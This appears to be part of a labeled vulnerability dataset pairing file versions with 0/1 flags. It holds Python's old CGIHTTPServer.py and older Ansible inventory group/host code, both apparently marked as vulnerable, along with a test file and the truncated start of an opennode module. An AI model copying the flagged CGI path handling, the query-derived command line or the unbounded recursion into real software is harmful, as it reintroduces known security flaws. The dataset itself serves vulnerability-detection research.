        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
9,9,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
36,36,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0
37,37,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1
164,164,0a87ba7972cdcab6ce77568e8d0eb8474132315d,"opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context
from zope.component import provideSubscriptionAdapter
import argparse
import os

from opennode.oms.endpoint.ssh import cmd
from opennode.oms.endpoint.ssh.completion import Completer
from opennode.oms.endpoint.ssh.cmdline import GroupDictAction
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model import creatable_models
from opennode.oms.zodb import db


class CommandCompleter(Completer):
    """"""Completes a command.""""""

    context(cmd.NoCommand)

    def complete(self, token, parsed, parser):
        return [name for name in cmd.commands().keys() if name.startswith(token)]


class PathCompleter(Completer):
    """"""Completes a path name.""""""
    baseclass()

    @db.transact
    def complete(self, token, parsed, parser):
        if not self.consumed(parsed, parser):
            base_path = os.path.dirname(token)
            container = self.context.traverse(base_path)

            if IContainer.providedBy(container):
                def dir_suffix(obj):
                    return '/' if IContainer.providedBy(obj) else ''

                def name(obj):
                    return os.path.join(base_path, obj.__name__)

                return [name(obj) + dir_suffix(obj) for obj in container.listcontent() if name(obj).startswith(token)]


        return []

    def consumed(self, parsed, parser):
        """"""Check whether we have already consumed all positional arguments.""""""

        maximum = 0
        actual = 0
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                # For every positional argument:
